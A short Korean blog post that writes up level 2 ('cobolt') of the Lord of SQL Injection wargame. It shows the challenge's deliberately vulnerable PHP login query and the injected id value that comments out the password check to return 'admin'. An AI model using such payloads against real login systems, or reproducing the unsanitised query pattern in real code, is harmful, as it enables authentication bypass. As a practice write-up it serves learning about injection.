---
layout: post
title: "[2] Lord Of Sqlinjection"
description: ""
categories : etc
sub_categories : ""
date: 2015-12-08
tags: []
comments: true
share: true
---


9번 라인 조건에 $result['id'] 의 값이 admin으로 고정되어있다.

쿼리문('id='1' or '1=1' and id='admin'#' and pw=md5('')')준비하고 요청한다.
    
    <?php
      include "../config.php"; 
      login_chk();
      dbconnect();
      if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
      if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
      $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
      echo "query : {$query}"; 
      $result = @mysql_fetch_array(mysql_query($query)); 
      if($result['id'] == 'admin') solve("cobolt");
      elseif($result['id']) echo "Hello {$result['id']}You are not admin :("; 
      highlight_file(__FILE__); 
    ?>

  

![](/assets/images/posts/414/234CD1475666A52B378792.PNG)

  

